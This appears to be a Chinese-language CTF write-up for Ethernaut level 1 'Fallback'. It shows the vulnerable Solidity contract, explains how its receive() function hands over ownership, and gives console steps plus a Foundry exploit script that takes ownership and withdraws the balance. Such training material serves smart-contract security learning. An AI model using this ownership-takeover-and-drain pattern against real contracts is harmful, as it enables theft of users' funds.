# Ethernaut CTF Writeup

## Level 1 Title

> 題目: https://ethernaut.openzeppelin.com/level/0x716747Fbc1FcE4c36F2B369F87aDB5D4580e807f

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

過關條件: 

- 獲得合約的所有權

解法：

- 要取得這份 Solidity 智能合約的所有權，需要滿足以下條件
    - 利用 `contribute()` 函數：當使用 `contribute()` 函數進行捐款時，如果貢獻超過當前擁有者的貢獻，將成為新的擁有者
    - 利用 `receive()` 函數：如果您已經在 `contributions` 中有貢獻（大於0），可以通過直接向合約地址發送超過 0 的 ETH 來觸發 `receive()` 函數，這樣合約的擁有者將被設置為 `msg.sender` 的地址
- 步驟
    - `contract.contribute({value:1})` 確保已經有貢獻: 首先，需要使用 `contribute()` 函數進行少量捐款（小於 `0.001 ether`），以便在 `contributions` 中創建地址條目，這樣將有機會在後續步驟中獲得所有權
    - `contract.sendTransaction({value:1})` 向合約發送 ETH，以觸發 receive() 函數
    - `msg.sender` 將成為新的擁有者
    - `contract.withdraw()` 提取所有的錢

- Foundry - level1.s.sol

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Fallback} from "../src/level1/Fallback.sol";

contract PwnFallback is Script {
    Fallback target = Fallback(payable(0x80376c49C00b7e6E1f123dabFF04347195eEFa2a));

    function run() public {
        vm.startBroadcast();
        console.log("Current Owner is: ", target.owner());
        
        // get the owner
        target.contribute{value: 1 wei}();
        address(target).call{value: 1 wei}("");
        target.withdraw();
        
        console.log("Current Owner is: ", target.owner());
        vm.stopBroadcast();
    }
}
```